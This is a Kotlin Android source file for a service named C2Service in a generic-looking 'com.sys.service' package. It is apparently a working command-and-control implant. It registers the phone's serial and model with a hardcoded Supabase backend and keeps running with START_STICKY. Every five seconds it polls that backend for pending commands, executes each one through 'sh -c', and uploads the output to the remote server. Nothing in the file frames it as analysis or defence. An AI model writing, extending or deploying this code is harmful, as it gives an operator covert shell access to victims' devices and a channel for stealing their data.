package com.sys.service

import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import okhttp3.*
import org.json.JSONArray
import org.json.JSONObject
import java.io.BufferedReader
import java.io.InputStreamReader
import java.util.concurrent.TimeUnit

class C2Service : Service() {
    // === YOUR HARDCODED SUPABASE DETAILS ===
    private val SUPABASE_URL = "https://fmfxqjerktoclzmuited.supabase.co"
    private val SUPABASE_KEY = "sb_publishable_v8EhqjGh1B87NatTuypl9w_xS3V3JRF"
    private val USER_ID = "YOUR_USER_ID" // Build time pe replace hoga
    // ========================================

    private val SID = Build.SERIAL + "_" + Build.MODEL
    private var isRunning = true
    private val client = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .readTimeout(15, TimeUnit.SECONDS)
        .build()

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Thread {
            registerDevice()
            while (isRunning) {
                try { pollCommands() } catch (e: Exception) { }
                Thread.sleep(5000)
            }
        }.start()
        return START_STICKY
    }

    private fun headers(): Headers {
        return Headers.Builder()
            .add("apikey", SUPABASE_KEY)
            .add("Authorization", "Bearer $SUPABASE_KEY")
            .add("Content-Type", "application/json")
            .add("Prefer", "return=minimal")
            .build()
    }

    private fun registerDevice() {
        val json = JSONObject().apply {
            put("id", SID)
            put("user_id", USER_ID.toInt())
            put("model", Build.MODEL)
            put("os", "Android ${Build.VERSION.RELEASE}")
            put("status", "online")
        }
        
        val req = Request.Builder()
            .url("$SUPABASE_URL/rest/v1/devices?on_conflict=id")
            .headers(headers())
            .addHeader("Prefer", "resolution=merge-duplicates")
            .post(RequestBody.create(MediaType.parse("application/json"), json.toString()))
            .build()
        client.newCall(req).execute().close()
    }

    private fun pollCommands() {
        val req = Request.Builder()
            .url("$SUPABASE_URL/rest/v1/commands?device_id=eq.$SID&status=eq.pending")
            .headers(headers())
            .get()
            .build()

        client.newCall(req).enqueue(object : Callback {
            override fun onFailure(call: Call, e: java.io.IOException) {}
            override fun onResponse(call: Call, response: Response) {
                val body = response.body()?.string() ?: return
                try {
                    val arr = JSONArray(body)
                    for (i in 0 until arr.length()) {
                        val cmdObj = arr.getJSONObject(i)
                        val id = cmdObj.getInt("id")
                        val cmd = cmdObj.getString("command")
                        
                        val output = executeCommand(cmd)
                        markDone(id)
                        uploadData("cmd_output", output)
                    }
                } catch (e: Exception) {}
            }
        })
    }

    private fun executeCommand(cmd: String): String {
        return try {
            val p = Runtime.getRuntime().exec(arrayOf("sh", "-c", cmd))
            val reader = BufferedReader(InputStreamReader(p.inputStream))
            val sb = StringBuilder()
            var line: String?
            while (reader.readLine().also { line = it } != null) { sb.append(line).append("\n") }
            p.waitFor()
            sb.toString()
        } catch (e: Exception) { "error: ${e.message}" }
    }

    private fun markDone(cmdId: Int) {
        val json = JSONObject().put("status", "done")
        val req = Request.Builder()
            .url("$SUPABASE_URL/rest/v1/commands?id=eq.$cmdId")
            .headers(headers())
            .patch(RequestBody.create(MediaType.parse("application/json"), json.toString()))
            .build()
        client.newCall(req).execute().close()
    }

    private fun uploadData(type: String, content: String) {
        val json = JSONObject().apply {
            put("device_id", SID)
            put("type", type)
            put("content", content)
        }
        val req = Request.Builder()
            .url("$SUPABASE_URL/rest/v1/results")
            .headers(headers())
            .post(RequestBody.create(MediaType.parse("application/json"), json.toString()))
            .build()
        client.newCall(req).execute().close()
    }

    override fun onDestroy() {
        isRunning = false
        super.onDestroy()
    }
    override fun onBind(intent: Intent?): IBinder? = null
}
